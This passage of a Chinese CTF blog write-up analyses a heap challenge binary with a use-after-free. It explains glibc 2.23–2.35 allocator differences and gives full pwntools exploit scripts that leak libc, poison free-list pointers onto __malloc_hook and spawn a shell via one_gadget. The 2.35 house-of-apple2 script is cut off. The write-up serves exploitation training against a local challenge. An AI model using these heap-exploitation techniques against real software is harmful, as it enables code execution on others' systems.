class="built_in">puts</span>(<span class="string">&quot;no such chunk!&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>用printf来打印chunk内容，有一点需要注意就是\x00会被截断。</p><h5 id="edit函数"><a href="#edit函数" class="headerlink" title="edit函数"></a>edit函数</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">ssize_t</span> <span class="title function_">edit</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v1; <span class="comment">// [rsp+4h] [rbp-Ch] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v2; <span class="comment">// [rsp+8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v2 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  v1 = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;idx? &quot;</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%d&quot;</span>, &amp;v1);</span><br><span class="line">  <span class="keyword">if</span> ( v1 &lt;= <span class="number">0xF</span> &amp;&amp; ptr[v1] )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;content : &quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> read(<span class="number">0</span>, (<span class="type">void</span> *)ptr[v1], (<span class="type">unsigned</span> <span class="type">int</span>)ptr_size[v1]);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;no such chunk!&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>没有堆溢出，但是已经有UAF了所以无所谓。</p><h5 id="Exit函数"><a href="#Exit函数" class="headerlink" title="Exit函数"></a>Exit函数</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> __noreturn <span class="title function_">Exit</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [rsp+Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">15</span>; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( !ptr[i] )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">free</span>((<span class="type">void</span> *)ptr[i]);</span><br><span class="line">      ptr[i] = <span class="number">0LL</span>;</span><br><span class="line">      ptr_size[i] = <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>有exit(0)，可以打exithook或者exit的got表。</p><p>总的来看最大且最危险的漏洞就是UAF，可以说有了这个洞这些题在堆风水的布局上可以为所欲为了。</p><h3 id="0x02-2-23"><a href="#0x02-2-23" class="headerlink" title="0x02 2.23"></a>0x02 2.23</h3><h5 id="版本特性"><a href="#版本特性" class="headerlink" title="版本特性"></a>版本特性</h5><p>2.23版本没有tcachebin，fastbin中double free只需要在两次free当中free掉另一个chunk就好了。fastbin最大是0x80，要泄露libc只需要申请unsorted chunk即可。fastbin会在用户取出chunk的时候检查size字段是否合法。fastbin链表中的地址是chunk头地址，不是mem（用户内容）地址。</p><h5 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h5><p>泄露libc只要申请0x90的chunk释放掉再show就好了。</p><p>这个程序只开了partial relro，理论上可以打got表。这里我选择打malloc_hook。这题甚至不需要double free，只要delete一个chunk之后改掉其fd为malloc_hook-0x23，再申请两次同样大小的chunk就能打到malloc_hook-0x23。之所以要-0x23是为了绕过size字段的检查，那个地方有个0x007f，所以我们在申请chunk的时候要申请总大小为0x70的chunk以满足检查条件。</p><p>申请到hook处用edit改hook为onegadget，然后再申请一个chunk就能getshell了。</p><h5 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>, os=<span class="string">&#x27;linux&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">r = process(<span class="string">&#x27;./heap&#x27;</span>)</span><br><span class="line">e = ELF(<span class="string">&#x27;./heap&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc-2.23.so&#x27;</span>)  <span class="comment"># 打本地，用的是2.23_3</span></span><br><span class="line"></span><br><span class="line">one = [<span class="number">0x4525a</span>, <span class="number">0xef9f4</span>, <span class="number">0xf0897</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">cmd</span>(<span class="params">choice</span>):</span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;&gt;&gt;&#x27;</span>)</span><br><span class="line">    r.sendline(<span class="built_in">str</span>(choice).encode())</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">idx, size</span>):</span><br><span class="line">    cmd(<span class="number">1</span>)</span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;idx? &#x27;</span>)</span><br><span class="line">    r.sendline(<span class="built_in">str</span>(idx).encode())</span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;size? &#x27;</span>)</span><br><span class="line">    r.sendline(<span class="built_in">str</span>(size).encode())</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">idx</span>):</span><br><span class="line">    cmd(<span class="number">2</span>)</span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;idx? &#x27;</span>)</span><br><span class="line">    r.sendline(<span class="built_in">str</span>(idx).encode())</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">idx</span>):</span><br><span class="line">    cmd(<span class="number">3</span>)</span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;idx? &#x27;</span>)</span><br><span class="line">    r.sendline(<span class="built_in">str</span>(idx).encode())</span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;content : &#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">idx, content=<span class="string">b&#x27;deafbeef&#x27;</span></span>):</span><br><span class="line">    cmd(<span class="number">4</span>)</span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;idx? &#x27;</span>)</span><br><span class="line">    r.sendline(<span class="built_in">str</span>(idx).encode())</span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;content : &#x27;</span>)</span><br><span class="line">    r.send(content)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">exit</span>():</span><br><span class="line">    cmd(<span class="number">5</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">add(<span class="number">0</span>, <span class="number">0x90</span>)</span><br><span class="line">add(<span class="number">1</span>, <span class="number">0x18</span>)</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">libc_base = u64(r.recv(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))-<span class="number">0x3c3b78</span></span><br><span class="line">log.info(<span class="string">&#x27;libc_base:&#x27;</span>+<span class="built_in">hex</span>(libc_base))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">add(<span class="number">2</span>, <span class="number">0x90</span>)</span><br><span class="line">add(<span class="number">3</span>, <span class="number">0x60</span>)</span><br><span class="line">add(<span class="number">4</span>, <span class="number">0x60</span>)</span><br><span class="line">add(<span class="number">5</span>, <span class="number">0x20</span>)</span><br><span class="line"></span><br><span class="line">delete(<span class="number">3</span>)</span><br><span class="line">delete(<span class="number">4</span>)</span><br><span class="line"><span class="comment"># edit(4, p64(libc_base+0x3c3b10-0x23))</span></span><br><span class="line">edit(<span class="number">4</span>, p64(libc_base+libc.symbols[<span class="string">&#x27;__malloc_hook&#x27;</span>]-<span class="number">0x23</span>))  <span class="comment"># 似乎有时候会-11卡住不知道为啥</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># gdb.attach(r)</span></span><br><span class="line">add(<span class="number">6</span>, <span class="number">0x60</span>)</span><br><span class="line">add(<span class="number">7</span>, <span class="number">0x60</span>)</span><br><span class="line">edit(<span class="number">7</span>, <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x13</span>+p64(libc_base+one[<span class="number">1</span>]))</span><br><span class="line"></span><br><span class="line">add(<span class="number">8</span>, <span class="number">0x20</span>)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><h3 id="0x03-2-27"><a href="#0x03-2-27" class="headerlink" title="0x03 2.27"></a>0x03 2.27</h3><h5 id="版本特性-1"><a href="#版本特性-1" class="headerlink" title="版本特性"></a>版本特性</h5><p>2.27版本有tcachebin，但是在2.27的低子版本并没有对tcachebin中chunk double free检查的机制，但是高子版本打了补丁之后就有了。所以很难说远程2.27到底能不能随心所欲的double free，一般都没有。tcachebin不会检查size字段。tcache不会检查bin内可用的chunk数量。</p><h5 id="思路-1"><a href="#思路-1" class="headerlink" title="思路"></a>思路</h5><p>因为tcachebin覆盖大小到0x410的chunk，所以泄露libc要申请大于0x410的chunk释放掉再show。</p><p>这个程序全保护，这里我依然选择打malloc_hook。这题还是不需要double free，只要delete一个chunk之后改掉其fd为malloc_hook，再申请两次同样大小的chunk就能打到malloc_hook。</p><p>申请到hook处用edit改hook为onegadget，然后再申请一个chunk就能getshell了。</p><h5 id="EXP-1"><a href="#EXP-1" class="headerlink" title="EXP"></a>EXP</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>, os=<span class="string">&#x27;linux&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">r = process(<span class="string">&#x27;./heap&#x27;</span>)</span><br><span class="line">e = ELF(<span class="string">&#x27;./heap&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc-2.27.so&#x27;</span>)  <span class="comment"># 打本地，用的是2.27_3_1</span></span><br><span class="line"></span><br><span class="line">one = [<span class="number">0x4f2be</span>, <span class="number">0x4f2c5</span>, <span class="number">0x4f322</span>, <span class="number">0x10a38c</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dbg</span>():</span><br><span class="line">    gdb.attach(r)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">cmd</span>(<span class="params">choice</span>):</span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;&gt;&gt;&#x27;</span>)</span><br><span class="line">    r.sendline(<span class="built_in">str</span>(choice).encode())</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">idx, size</span>):</span><br><span class="line">    cmd(<span class="number">1</span>)</span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;idx? &#x27;</span>)</span><br><span class="line">    r.sendline(<span class="built_in">str</span>(idx).encode())</span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;size? &#x27;</span>)</span><br><span class="line">    r.sendline(<span class="built_in">str</span>(size).encode())</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">idx</span>):</span><br><span class="line">    cmd(<span class="number">2</span>)</span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;idx? &#x27;</span>)</span><br><span class="line">    r.sendline(<span class="built_in">str</span>(idx).encode())</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">idx</span>):</span><br><span class="line">    cmd(<span class="number">3</span>)</span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;idx? &#x27;</span>)</span><br><span class="line">    r.sendline(<span class="built_in">str</span>(idx).encode())</span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;content : &#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">idx, content=<span class="string">b&#x27;deafbeef&#x27;</span></span>):</span><br><span class="line">    cmd(<span class="number">4</span>)</span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;idx? &#x27;</span>)</span><br><span class="line">    r.sendline(<span class="built_in">str</span>(idx).encode())</span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;content : &#x27;</span>)</span><br><span class="line">    r.send(content)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">exit</span>():</span><br><span class="line">    cmd(<span class="number">5</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">add(<span class="number">0</span>, <span class="number">0x500</span>)</span><br><span class="line">add(<span class="number">1</span>, <span class="number">0x18</span>)</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">libc_base = u64(r.recv(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))-<span class="number">0x3ebca0</span></span><br><span class="line">log.info(<span class="string">&#x27;libc_base:&#x27;</span>+<span class="built_in">hex</span>(libc_base))</span><br><span class="line">add(<span class="number">2</span>, <span class="number">0x500</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">3</span>, <span class="number">0x70</span>)</span><br><span class="line">add(<span class="number">4</span>, <span class="number">0x70</span>)</span><br><span class="line">delete(<span class="number">3</span>)</span><br><span class="line">delete(<span class="number">4</span>)</span><br><span class="line"><span class="comment"># dbg()</span></span><br><span class="line">edit(<span class="number">4</span>, p64(libc_base+libc.symbols[<span class="string">&#x27;__malloc_hook&#x27;</span>]))</span><br><span class="line"><span class="comment"># dbg()</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">5</span>, <span class="number">0x70</span>)</span><br><span class="line">add(<span class="number">6</span>, <span class="number">0x70</span>)</span><br><span class="line"><span class="comment"># dbg()</span></span><br><span class="line">edit(<span class="number">6</span>, p64(libc_base+one[<span class="number">3</span>]))</span><br><span class="line"></span><br><span class="line">add(<span class="number">7</span>, <span class="number">0x30</span>)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><h3 id="0x04-2-31"><a href="#0x04-2-31" class="headerlink" title="0x04 2.31"></a>0x04 2.31</h3><h5 id="版本特性-2"><a href="#版本特性-2" class="headerlink" title="版本特性"></a>版本特性</h5><p>2.31版本的tcachebin有一系列检查，tcache会检查bin内可用的chunk数量，会检查bin内double free。但是还不会加密fd，加密fd机制是从2.32版本开始的。tcachebin不会检查size字段。这时候tcachebin想要doublefree可以使用house of botcake或者利用fastbin来doublefree。</p><h5 id="思路-2"><a href="#思路-2" class="headerlink" title="思路"></a>思路</h5><p>因为tcachebin覆盖大小到0x410的chunk，所以泄露libc要申请大于0x410的chunk释放掉再show。</p><p>这个程序全保护，这里我依然选择打malloc_hook。这题还是不需要double free，只要delete一个chunk之后改掉其fd为malloc_hook，再申请两次同样大小的chunk就能打到malloc_hook。</p><p>申请到hook处用edit改hook为onegadget，然后再申请一个chunk就能getshell了。</p><p>其实这题还可以选择劫持exit_hook，改lock指针。</p><h5 id="EXP-2"><a href="#EXP-2" class="headerlink" title="EXP"></a>EXP</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>, os=<span class="string">&#x27;linux&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">r = process(<span class="string">&#x27;./heap&#x27;</span>)</span><br><span class="line">e = ELF(<span class="string">&#x27;./heap&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc-2.31.so&#x27;</span>)  <span class="comment"># 打本地，用的是2.31_9</span></span><br><span class="line"></span><br><span class="line">one = [<span class="number">0xe6aee</span>, <span class="number">0xe6af1</span>, <span class="number">0xe6af4</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dbg</span>():</span><br><span class="line">    gdb.attach(r)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">cmd</span>(<span class="params">choice</span>):</span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;&gt;&gt;&#x27;</span>)</span><br><span class="line">    r.sendline(<span class="built_in">str</span>(choice).encode())</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">idx, size</span>):</span><br><span class="line">    cmd(<span class="number">1</span>)</span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;idx? &#x27;</span>)</span><br><span class="line">    r.sendline(<span class="built_in">str</span>(idx).encode())</span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;size? &#x27;</span>)</span><br><span class="line">    r.sendline(<span class="built_in">str</span>(size).encode())</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">idx</span>):</span><br><span class="line">    cmd(<span class="number">2</span>)</span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;idx? &#x27;</span>)</span><br><span class="line">    r.sendline(<span class="built_in">str</span>(idx).encode())</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">idx</span>):</span><br><span class="line">    cmd(<span class="number">3</span>)</span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;idx? &#x27;</span>)</span><br><span class="line">    r.sendline(<span class="built_in">str</span>(idx).encode())</span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;content : &#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">idx, content=<span class="string">b&#x27;deafbeef&#x27;</span></span>):</span><br><span class="line">    cmd(<span class="number">4</span>)</span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;idx? &#x27;</span>)</span><br><span class="line">    r.sendline(<span class="built_in">str</span>(idx).encode())</span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;content : &#x27;</span>)</span><br><span class="line">    r.send(content)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">exit</span>():</span><br><span class="line">    cmd(<span class="number">5</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">add(<span class="number">0</span>, <span class="number">0x500</span>)</span><br><span class="line">add(<span class="number">1</span>, <span class="number">0x18</span>)</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">dbg()</span><br><span class="line">libc_base = u64(r.recv(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))-<span class="number">0x1ebbe0</span></span><br><span class="line">log.info(<span class="string">&#x27;libc_base:&#x27;</span>+<span class="built_in">hex</span>(libc_base))</span><br><span class="line">add(<span class="number">2</span>, <span class="number">0x500</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">3</span>, <span class="number">0x70</span>)</span><br><span class="line">add(<span class="number">4</span>, <span class="number">0x70</span>)</span><br><span class="line">delete(<span class="number">3</span>)</span><br><span class="line">delete(<span class="number">4</span>)</span><br><span class="line">edit(<span class="number">4</span>, p64(libc_base+libc.symbols[<span class="string">&#x27;__malloc_hook&#x27;</span>]))</span><br><span class="line"><span class="comment"># dbg()</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">5</span>, <span class="number">0x70</span>)</span><br><span class="line">add(<span class="number">6</span>, <span class="number">0x70</span>)</span><br><span class="line"><span class="comment"># dbg()</span></span><br><span class="line">edit(<span class="number">6</span>, p64(libc_base+one[<span class="number">1</span>]))</span><br><span class="line"></span><br><span class="line">add(<span class="number">7</span>, <span class="number">0x30</span>)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><h3 id="0x05-2-35"><a href="#0x05-2-35" class="headerlink" title="0x05 2.35"></a>0x05 2.35</h3><h5 id="版本特性-3"><a href="#版本特性-3" class="headerlink" title="版本特性"></a>版本特性</h5><p>2.35版本的tcachebin有一系列检查，tcache会检查bin内可用的chunk数量，会检查bin内double free，对chunk地址有对齐检查，fd会被加密，并且利加密的key存在tls结构体里。2.34版本及之前key是指向TcacheBin的指针。tcachebin不会检查size字段。</p><p>从2.34开始glibc取消掉了hook机制，所以没法打malloc和free hook了，但是exit hook中还有一条路可以走，也就是house of banana，或者劫持__call_tls_dtors函数。</p><h5 id="思路-3"><a href="#思路-3" class="headerlink" title="思路"></a>思路</h5><p>这个程序全保护，因为fd被加密了，虽然这题UAF可以打到tls泄露key来劫持fd，但是比较麻烦，所以我选择house of apple2。这几乎是全版本通解，只要能largebin attack，能触发IO。因为是第一次使用house of apple2来打堆题，所以完整的做题步骤及调试过程另起文章记录。这题直接板子做题法。</p><h5 id="EXP-3"><a href="#EXP-3" class="headerlink" title="EXP"></a>EXP</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span 